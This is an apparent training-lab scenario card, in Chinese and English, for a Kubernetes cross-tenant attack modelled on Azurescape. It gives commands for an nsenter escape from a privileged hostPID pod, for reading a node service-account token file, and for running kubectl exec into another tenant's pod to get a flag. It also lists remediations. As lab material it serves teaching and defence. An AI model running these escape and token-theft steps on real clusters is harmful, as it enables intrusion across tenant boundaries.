# CLOUD-12 多租户 K8s：容器逃逸 → 跨租户访问

## 场景信息

| 字段 | 值 |
|---|---|
| ID | CLOUD-12 |
| 名称 | Multi-Tenant K8s: Container Escape → Cross-Tenant Access |
| 技术/CVE | N/A (privileged container + hostPID escape) |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
模拟 Azurescape 式跨租户攻击：tenant-a 的 pod 是特权容器
（privileged + hostPID + hostNetwork）。攻击者从容器逃逸到共享
KIND 节点，再借节点上挂载的 SA token 横向进入 tenant-b 的 pod。

## 教材锚点
- 案例：Azurescape（#054）；GKE Autopilot 逃逸（Ch6 Level 3）
- 平面：数据面（容器）→ 节点 → 集群；失败边界：命名空间/宿主
- 六镜头：SHARED（多租户共享同一节点）；IDENTITY（节点上其他
  pod 的 SA token 可被读取）

## 前置知识
- 特权容器逃逸（nsenter）；hostPID/hostNetwork；SA token 窃取

## 利用步骤
1. 进入 tenant-a 的 attacker pod。
2. `nsenter --target 1 --mount --uts --ipc --net --pid -- sh`
   逃逸到节点。
3. 读取节点上 pod 挂载的 SA token，用其调用 K8s API。
4. 对 tenant-b 的 target pod 执行 exec，读取环境变量中的 flag。

## Flag
`flag{cloud-12-cross-tenant}`（tenant-b target pod 环境）

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | KIND, privileged containers, hostPID, and tenant namespaces |
| 侦察与前置条件 | Host escape primitive and co-tenant workload discovery |
| 核心漏洞与利用 | Escape the compromised tenant container |
| 权限、横向或影响 | Cross-tenant cluster/host access |
| 验证 | Read the victim tenant flag |

## 修复建议
禁用特权容器；节点隔离租户工作负载；禁止 hostPID/hostNetwork；
使用沙箱运行时。

## Kubernetes 专项利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (privileged container + hostPID escape) |
| Difficulty | L3 |
| Type | k8s |
| Path | scenarios/cloud/multi-tenant-k8s |

## Attack Path Summary
Deploy privileged pod in tenant-a → nsenter to host → discover bridge SA token → kubectl exec into tenant-b pod → read cross-tenant flag

## Prerequisites
### Knowledge
- Container escape techniques (privileged mode, hostPID, nsenter)
- Kubernetes node-level ServiceAccount tokens (bridge SA)
- Multi-tenant K8s architecture (shared control plane)

### Tools
- nsenter: Enter host namespaces from privileged container
- kubectl: K8s API interaction using bridge ServiceAccount token

## Step-by-Step Exploitation
### Step 1: Escape Privileged Container to Host
```bash
kubectl exec -it -n tenant-a attacker -- sh
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

### Step 2: Discover Bridge SA Token
On the host node, locate the bridge ServiceAccount token used for cross-tenant k8s API access.

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Step 3: Cross-Tenant Pod Access
Use the bridge SA token to exec into the target pod in tenant-b.

```bash
kubectl exec -it -n tenant-b target -- env | grep FLAG
```

## Flag Location
- Flag: Environment variable in tenant-b target pod

## Verification Commands
```bash
kubectl get pods -n tenant-a
kubectl get pods -n tenant-b
kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
```
